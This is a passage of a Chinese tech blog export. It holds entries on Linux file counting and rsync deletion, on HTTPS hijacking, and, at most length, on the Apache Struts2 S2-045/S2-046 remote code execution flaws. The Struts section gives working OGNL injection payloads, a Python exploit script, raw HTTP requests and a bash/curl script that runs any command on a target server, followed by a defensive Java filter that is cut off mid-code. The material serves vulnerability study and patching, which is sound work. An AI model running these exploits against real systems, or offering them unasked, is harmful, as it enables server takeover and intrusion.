    <content><![CDATA[<p><a href="http://www.jb51.net/article/56474.htm">这篇文章</a>主要介绍了Linux下统计当前文件夹下的文件个数、目录个数,本文使用ls命令配合管理、grep命令实现统计需求.</p><p>1) 统计当前文件夹下文件的个数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |grep "^-"|wc -l</span><br></pre></td></tr></table></figure><p>2) 统计当前文件夹下目录的个数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |grep "^d"|wc -l</span><br></pre></td></tr></table></figure><p>3) 统计当前文件夹下文件的个数，包括子文件夹里的</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -lR|grep "^-"|wc -l</span><br></pre></td></tr></table></figure><p>4) 统计文件夹下目录的个数，包括子文件夹里的</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -lR|grep "^d"|wc -l</span><br></pre></td></tr></table></figure><p>说明：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p>长列表输出当前文件夹下文件信息(注意这里的文件，不同于一般的文件，可能是目录、链接、设备文件等)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep "^-"</span><br></pre></td></tr></table></figure><p>这里将长列表输出信息过滤一部分，只保留一般文件，如果只保留目录就是 ^d</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wc -l</span><br></pre></td></tr></table></figure><p>统计输出信息的行数，因为已经过滤得只剩一般文件了，所以统计结果就是一般文件信息的行数，又由于一行信息对应一个文件，所以也就是文件的个数。</p><h2 id="linux-快速删除大量文件夹-大文件"><a href="#linux-快速删除大量文件夹-大文件" class="headerlink" title="linux 快速删除大量文件夹/大文件"></a>linux 快速删除大量文件夹/大文件</h2><p>假如你要在linux下删除大量文件，比如100万、1000万，那么rm -rf *可能就不好使了. rsync 可以用来清空目录或文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir empty_dir</span><br><span class="line">rsync -a --delete empty_dir/    yourdirectory/</span><br><span class="line">rm -r empty_dir/ yourdirectory/</span><br></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">rsync <span class="params">--delete-before</span> -a -H -v <span class="params">--progress</span> <span class="params">--stats</span> <span class="string">/tmp/test/</span> log/</span><br></pre></td></tr></table></figure><p>选项说明：<br>–delete-before 接收者在传输之前进行删除操作<br>–progress 在传输时显示传输过程<br>-a 归档模式，表示以递归方式传输文件，并保持所有文件属性<br>-H 保持硬连接的文件<br>-v 详细输出模式<br>–stats 给出某些文件的传输状态</p><h3 id="为什么rsync能够快速删除大文件"><a href="#为什么rsync能够快速删除大文件" class="headerlink" title="为什么rsync能够快速删除大文件"></a>为什么rsync能够快速删除大文件</h3><h4 id="rm-会重建"><a href="#rm-会重建" class="headerlink" title="rm 会重建"></a>rm 会重建</h4><p>rm命令大量调用了lstat64和unlink，可以推测删除每个文件前都从文件系统中做过一次lstat操作。过程：正式删除工作的第一阶段，需要通过getdirentries64调用，分批读取目录（每次大约为4K），在内存中建立rm的文件列表；第二阶段，lstat64确定所有文件的状态；第三阶段，通过unlink执行实际删除。这三个阶段都有比较多的系统调用和文件系统操作。</p><h4 id="rsync所做的系统调用很少"><a href="#rsync所做的系统调用很少" class="headerlink" title="rsync所做的系统调用很少"></a>rsync所做的系统调用很少</h4><p>rsync所做的系统调用很少：没有针对单个文件做lstat和unlink操作。命令执行前期，rsync开启了一片共享内存，通过mmap方式加载目录信息。只做目录同步，不需要针对单个文件做unlink。</p><h4 id="rm的上下文切换比较多"><a href="#rm的上下文切换比较多" class="headerlink" title="rm的上下文切换比较多"></a>rm的上下文切换比较多</h4><p>另外，在其他人的评测里，rm的上下文切换比较多，会造成System CPU占用较多——对于文件系统的操作，简单增加并发数并不总能提升操作速度。</p><h4 id="频繁做减法不如直接从头来过"><a href="#频繁做减法不如直接从头来过" class="headerlink" title="频繁做减法不如直接从头来过"></a>频繁做减法不如直接从头来过</h4><p>把文件系统的目录与书籍的目录做类比，rm删除内容时，将目录的每一个条目逐个删除(unlink)，需要循环重复操作很多次；rsync删除内容时，建立好新的空目录，替换掉老目录，基本没开销。</p>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>关于HTTPS劫持</title>
    <url>/2016/09/19/about-https-hijacking/</url>
    <content><![CDATA[<h2 id="关于HTTPS"><a href="#关于HTTPS" class="headerlink" title="关于HTTPS"></a>关于HTTPS</h2><p><a href="https://zh.wikipedia.org/wiki/HTTPS">HTTPS</a>的主要思想是在不安全的网络上创建一安全信道，并可在使用适当的加密包和服务器证书可被验证且可被信任时，对<a href="https://zh.wikipedia.org/wiki/%E7%AB%8A%E8%81%BD">窃听</a>和<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击</a>提供合理的防护。</p><p>HTTPS的信任继承基于预先安装在浏览器中的<a href="https://zh.wikipedia.org/wiki/%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84">证书颁发机构</a>（如VeriSign、Microsoft等）（意即“我信任证书颁发机构告诉我应该信任的”）。因此，一个到某网站的HTTPS连接可被信任，当且仅当：</p><ol><li>用户相信他们的浏览器正确实现了HTTPS且安装了正确的证书颁发机构；</li><li>用户相信证书颁发机构仅信任合法的网站；</li><li>被访问的网站提供了一个有效的证书，意即，它是由一个被信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；</li><li>该证书正确地验证了被访问的网站（如，访问<code>https://example</code>时收到了给“Example Inc.”而不是其它组织的证书）；</li><li>或者互联网上相关的节点是值得信任的，或者用户相信本协议的加密层（<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8">TLS</a>或SSL）不能被窃听者破坏。</li></ol><h2 id="HTTPS加密是如何防止流量劫持"><a href="#HTTPS加密是如何防止流量劫持" class="headerlink" title="HTTPS加密是如何防止流量劫持"></a>HTTPS加密是如何防止流量劫持</h2><p>HTTPS，是HTTP over SSL的意思，就是在HTTP明文通道的基础上，增加一层SSL加密通道。SSL协议是用于解决传输层安全问题的网络协议，其核心是基于公钥密码学理论实现了对服务器身份认证、数据的加密保护以及对数据完整性的校验等功能，确保传输数据的机密性和完整性，以及服务器身份的真实性。</p><p><img alt="HTTPS防止流量劫持" data-src="https-liuliangjiechi.png"></p><p>因为SSL协议提供了对服务器的身份认证，所以DNS劫持导致连接错误服务器的情况将会被发现进而终止连接，最终导致DNS挟持攻击无法实现;而SSL协议提供的数据加密和完整性校验，也解决了关键信息被嗅探以及数据内容被修改的问题。</p><p>使用<a href="http://www.telerik.com/fiddler">Fiddler</a>和<a href="https://portswigger.net/burp/help/suite_functions_csrfpoc.html">Burp Suite</a>这种能劫持https的，是因为加载了软件自己的根证书。</p><h2 id="HTTPS-前端劫持"><a href="#HTTPS-前端劫持" class="headerlink" title="HTTPS 前端劫持"></a>HTTPS 前端劫持</h2><p>在之前介绍的流量劫持文章里，曾提到一种『HTTPS 向下降级』的方案 —— 将页面中的 HTTPS 超链接全都替换成 HTTP 版本，让用户始终以明文的形式进行通信。</p><p>看到这，也许大家都会想到一个经典的中间人攻击工具 —— SSLStrip，通过它确实能实现这个效果。</p><p>不过今天讲解的，则是完全不同的思路，一种更有效、更先进的解决方案 —— <a href="http://drops.wooyun.org/tips/3199">HTTPS 前端劫持</a>。</p><p>使用 HTML5 带来的一项新技术 —— <a href="http://www.w3.org/TR/CSP/">Content Security Policy</a>，由于它是浏览器原生支持的，因此实施的非常彻底。</p><p>在我们的代理返回头中，加上如下 HTTP 头部，即可完美拦截 https 框架页了：<br><code>Content-Security-Policy: default-src * data &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; frame-src http://*</code></p><p>它是通过脚本跳转到 HTTPS 地址的。而浏览器的 <code>location</code> 是个及其特殊的属性，它可以被屏蔽，但无法被重写。因此我们难以控制页面的跳转情况。</p><p><code>location.href = &quot;https://passport.jd.com&quot;;</code></p><p>如果非要劫持京东页面，我们只能使用白名单的方式，特殊对待该站点。但这样就大幅增加了攻击成本。</p><p>尽可能多开启的 HSTS，HTTP Strict Transport Security</p><h2 id="其他相关链接"><a href="#其他相关链接" class="headerlink" title="其他相关链接"></a>其他相关链接</h2><p><a href="https://www.zhihu.com/question/22779469">知乎讨论</a><br><a href="https://zohead.com/archives/qiniu-https-tamper/">开启SRI防止七牛CDN HTTPS劫持</a><br><a href="http://www.cnblogs.com/coco1s/p/5777260.html">【前端安全】JavaScript防http劫持与XSS</a><br><a href="https://blog.wilddog.com/?p=210">扒一扒HTTPS网站的内幕</a><br><a href="https://segmentfault.com/a/1190000004199917">全站 HTTPS 来了</a><br>(<a href="https://yq.aliyun.com/articles/2978">https://yq.aliyun.com/articles/2978</a>)<br><a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">SSL/TLS协议运行机制的概述</a></p><p><img alt="阿裡開源項目 Tengine 發起人叔度的強圖" data-src="tshudu.jpg"></p>]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 struts s2-045和s2-046漏洞</title>
    <url>/2017/03/31/about-struts-s2-045-and-s2-046/</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。国内外都有大量厂商使用该框架。</p><p>Struts 2中此次存在远程代码执行漏洞(RCE)，主要是处理复杂数据类型时的默认解析，例文件上传，Jakarta Multipart parser，异常处理不当，进入buildErrorMessage触发点，导致OGNL代码执行。<a href="https://cwiki.apache.org/confluence/display/WW/S2-045">s2-045</a>中发现是<code>Content-Type</code>出现异常处理不当。<a href="https://cwiki.apache.org/confluence/display/WW/S2-046">s2-046</a>中发现<code>Content-Disposition</code>的filename存在空字节时，或者是当使用JakartaStreamMultiPartRequest(<code>&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code>)时，<code>Content-Length</code> 的长度值超长。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><h2 id="漏洞自测触发POC-来源网络"><a href="#漏洞自测触发POC-来源网络" class="headerlink" title="漏洞自测触发POC (来源网络)"></a>漏洞自测触发POC (来源网络)</h2><p>UDPATE: 2018-06-23 change “{ &#35;” to “ '{&#35;' “ for hexo or <code>{&#35;</code></p><p>攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程代码执行。</p><p>查看struts 2.3.15.1版本<br><img alt="filter中对request进行wrap" data-src="StrutsPrepareAndExecuteFilter_wrapRequest.png"><br><img alt="(PrepareOperations_warprequest" data-src="PrepareOperations_warprequest.png"><br><img alt="Dispatcher判断content-type是否包含multipart/form-data" data-src="Dispatcher_content-type.png"><br><img alt="MultiPartRequestWrapper构造方法中调用paser" data-src="MultiPartRequestWrapper_paser.png"><br><img alt="进入buildErrorMessage执行ognl" data-src="paser_buildErrorMessage.png"></p><h3><a href="#" class="headerlink"></a></h3><h3 id="S2-045-PoC-1"><a href="#S2-045-PoC-1" class="headerlink" title="S2-045 PoC_1"></a>S2-045 PoC_1</h3><p><code>Content-Type: haha~multipart/form-data %{&amp;#35;_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)};</code></p><h3 id="S2-045-PoC-2"><a href="#S2-045-PoC-2" class="headerlink" title="S2-045 PoC_2"></a>S2-045 PoC_2</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</span><br><span class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    register_openers()</span><br><span class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</span><br><span class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></span><br><span class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></span><br><span class="line">    request = urllib2.Request(str(sys.argv[<span class="number">1</span>]),datagen,headers=header)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    <span class="keyword">print</span> response.read()</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><h3 id="S2-046-PoC-1"><a href="#S2-046-PoC-1" class="headerlink" title="S2-046 PoC_1"></a>S2-046 PoC_1</h3><p>在Struts 2.3.20以上的版本中，Struts2才提供了可选择的通过Streams实现Jakarta组件解析的方式。<br>触发条件,使用非默认解析jakarta-stream。例在strust.xml中有加入<code>&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code>才能触发。<br>上传文件的大小（由Content-Length头指定）大于Struts2默认允许的最大大小（2M）。</p><p>触发漏洞的代码在 JakartaStreamMultiPartRequest类中，processUpload函数处理了content-length长度超长的异常，导致问题触发。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processUpload</span><span class="params">(HttpServletRequest request, String saveDir)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// Sanity check that the request is a multi-part/form-data request.</span></span><br><span class="line">    <span class="keyword">if</span> (ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">        <span class="comment">// Sanity check on request size.</span></span><br><span class="line">        <span class="keyword">boolean</span> requestSizePermitted = isRequestSizePermitted(request);</span><br><span class="line">        <span class="comment">// Interface with Commons FileUpload API</span></span><br><span class="line">        <span class="comment">// Using the Streaming API</span></span><br><span class="line">        ServletFileUpload servletFileUpload = <span class="keyword">new</span> ServletFileUpload();</span><br><span class="line">        FileItemIterator i = servletFileUpload.getItemIterator(request);</span><br><span class="line">        <span class="comment">// Iterate the file items</span></span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FileItemStream itemStream = i.next();</span><br><span class="line">                <span class="comment">// If the file item stream is a form field, delegate to the</span></span><br><span class="line">                <span class="comment">// field item stream handler</span></span><br><span class="line">                <span class="keyword">if</span> (itemStream.isFormField()) &#123;</span><br><span class="line">                    processFileItemStreamAsFormField(itemStream);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Delegate the file item stream for a file field to the</span></span><br><span class="line">                <span class="comment">// file item stream handler, but delegation is skipped</span></span><br><span class="line">                <span class="comment">// if the requestSizePermitted check failed based on the</span></span><br><span class="line">                <span class="comment">// complete content-size of the request.</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// prevent processing file field item if request size not allowed.</span></span><br><span class="line">                    <span class="comment">// also warn user in the logs.</span></span><br><span class="line">                    <span class="keyword">if</span> (!requestSizePermitted) &#123;</span><br><span class="line">                        addFileSkippedError(itemStream.getName(), request);</span><br><span class="line">                        LOG.warn(<span class="string">"Skipped stream '#0', request maximum size (#1) exceeded."</span>, itemStream.getName(), maxSize);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processFileItemStreamAsFileField(itemStream, saveDir);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LOG.warn(<span class="string">"Skipped stream '#0', request maximum size (#1) exceeded."</span>, itemStream.getName(), maxSize);</span><br></pre></td></tr></table></figure><p><a href="http://www.360zhijia.com/360anquanke/186154.html">原文</a></p><p>burp修改大小发送请求失败时候，可以试着去掉菜单栏<code>Repeater--&gt;Update Content-Length</code>的勾选，然后进行实验，这样修改的大小不会在被burp修改。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Length: 10000000</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z</span><br><span class="line">Content-Disposition: form-data; name="upload"; filename="%&#123;<span class="symbol">&amp;#35;</span>context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')&#125;"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Kaboom </span><br><span class="line"> </span><br><span class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z--</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin env python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host=<span class="string">"xxxxx"</span></span><br><span class="line">se=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">se.connect((host,<span class="number">80</span>))</span><br><span class="line">se.send(<span class="string">"GET / HTTP/1.1\n"</span>)</span><br><span class="line">se.send(<span class="string">"User-Agent:curl/7.29.0\n"</span>)</span><br><span class="line">se.send(<span class="string">"Host:"</span>+host+<span class="string">"\n"</span>)</span><br><span class="line">se.send(<span class="string">"Accept:*/*\n"</span>)</span><br><span class="line">se.send(<span class="string">"Content-Type:multipart/form-data; boundary=---------------------------735323031399963166993862150\n"</span>)</span><br><span class="line">se.send(<span class="string">"Connection:close\n"</span>)</span><br><span class="line">se.send(<span class="string">"Content-Length:1000000000\n"</span>)</span><br><span class="line">se.send(<span class="string">"\n\n"</span>)</span><br><span class="line">se.send(<span class="string">"-----------------------------735323031399963166993862150\n"</span>)</span><br><span class="line">se.send(<span class="string">'Content-Disposition: form-data; name="foo"; filename="%&#123;&amp;#35;context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'].addHeader(\'X-Test\',\'Kaboom\')&#125;"\n'</span>)</span><br><span class="line">se.send(<span class="string">"Content-Type: text/plain\n\n"</span>)</span><br><span class="line">se.send(<span class="string">"x\n"</span>)</span><br><span class="line">se.send(<span class="string">"-----------------------------735323031399963166993862150--\n\n"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  buf = se.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">print</span> buf</span><br></pre></td></tr></table></figure><p><a href="https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#">原文</a></p><h3 id="S2-046-PoC-2"><a href="#S2-046-PoC-2" class="headerlink" title="S2-046 PoC_2"></a>S2-046 PoC_2</h3><p>header中的Content-Disposition中包含空字节。<br>文件名内容构造恶意的OGNL内容。</p><p><img alt="JakartaMultiPartRequest中的processUpload" data-src="JakartaMultiPartRequest_processUpload.png"><br><img alt="processFileField中处理各个header头" data-src="JakartaMultiPartRequest_processFileField.png"><br><img alt="DiskFileItem的getName会处理NULL字符串" data-src="DiskFileItem_getName.png"><br><img alt="调用Streams中的checkFileName检查NULL字符串" data-src="Streams_checkFileName.png"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">url=$1</span><br><span class="line">cmd=$2</span><br><span class="line">shift</span><br><span class="line">shift</span><br><span class="line"> </span><br><span class="line">boundary="---------------------------735323031399963166993862150"</span><br><span class="line">content_type="multipart/form-data; boundary=$boundary"</span><br><span class="line">payload=$(echo "%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;")</span><br><span class="line"> </span><br><span class="line">printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@</span><br></pre></td></tr></table></figure><p>验证截图</p><p><img alt="验证截图" data-src="360_check.png"></p><p><a href="http://bobao.360.cn/learning/detail/3571.html">360安全客</a><br>当\0b不可当成检测字符，\0b可以被替换成\0000,\0a - \0z 等等。所以，最好是使用多种情况。<br>多个空格<br>多个空格，且里面可以添加\r\n<br>n个空格</p><h3 id="S2-046-PoC-3"><a href="#S2-046-PoC-3" class="headerlink" title="S2-046 PoC_3"></a>S2-046 PoC_3</h3><p><a href="https://github.com/pwntester/S2-046-PoC">S2-046-PoC</a></p><h3 id="Struts2漏洞利用工具"><a href="#Struts2漏洞利用工具" class="headerlink" title="Struts2漏洞利用工具"></a>Struts2漏洞利用工具</h3><p><a href="http://www.shack2.org/article/1374154000.html">shack2的Struts2漏洞利用工具</a><br>PS:大神该工具暂不支持https</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><h3 id="严格过滤"><a href="#严格过滤" class="headerlink" title="严格过滤"></a>严格过滤</h3><p>严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。</p><p>实际上，我们只需在struts的filter之前，添加上自己的filter，提前触发Content-Type 、filename的相关验证就行了。</p><p>添加filter示例<br>Struts2Filter.java：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.strutsfilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Struts2Filter</span> <span class="keyword">extends</span> <span class="title">StrutsPrepareAndExecuteFilter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        String contentType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> contentLength = request.getContentLength();</span><br><span class="line">        ServletContext sctx = request.getServletContext();</span><br><span class="line">        String params = sctx.getInitParameter(<span class="string">"content-type-param"</span>);</span><br><span class="line">        <span class="keyword">if</span> (request.getContentType() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            contentType = request.getContentType().toLowerCase(Locale.ENGLISH);</span><br><span class="line">            <span class="comment">// 请求大小小于2M，不是文件上传并且是正常请求时，放过</span></span><br><span class="line">            <span class="keyword">if</span> (params.contains(contentType) &amp;&amp; contentLength &lt; <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="keyword">super</span>.doFilter(request, response, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        contentType = contentType.contains(<span class="string">","</span>) ? contentType.split(<span class="string">","</span>)[<span class="number">0</span>].trim() : contentType.split(<span class="string">";"</span>)[<span class="number">0</span>].trim(); <span class="comment">// 文件上传时过滤掉文件边界</span></span><br><span class="line">        <span class="keyword">if</span> (contentType != <span class="keyword">null</span> &amp;&amp; contentLength &lt; <span class="number">2097152000</span>) &#123; <span class="comment">// 文件上传并且文件小于2g</span></span><br><span class="line">            <span class="keyword">if</span> (!Contain_space(request)) &#123; <span class="comment">// content-type位于白名单放过并且上传的文件名称当中不包括空字节</span></span><br><span class="line">                <span class="keyword">super</span>.doFilter(request, response, chain);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                PrintWriter writer = response.getWriter();</span><br><span class="line">                writer.write(<span class="string">"reject!"</span>);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Contain_space</span><span class="params">(ServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InputStream is = request.getInputStream();</span><br><span class="line">            BufferedReader read = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is, <span class="string">"utf-8"</span>));</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String tmp = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((tmp = read.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(tmp + <span class="string">"\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Pattern pattern = Pattern.compile(<span class="string">"filename(.*?)\r\n"</span>);</span><br><span class="line">            <span class="comment">// 从filename一直截取到下一个换行符位置，通过正则表达式过滤出上传的文件名称</span></span><br><span class="line">            Matcher matcher = pattern.matcher(sb.toString().toLowerCase(Locale.ENGLISH)); <span class="comment">// 将文件请求内容全部小写</span></span><br><span class="line">            <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">                String filename = matcher.group();</span><br><span class="line">                <span class="keyword">if</span> (filename.contains(<span class="string">"\\0b"</span>) || filename.contains(<span class="string">" "</span>) || filename.contains(<span class="string">"\\u0000"</span>)</span><br><span class="line">                        || filename.contains(<span class="string">"@ognl"</span>)) &#123; <span class="comment">// 对文件名称进行过滤，筛选掉含有空字符的上传请求</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">//e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 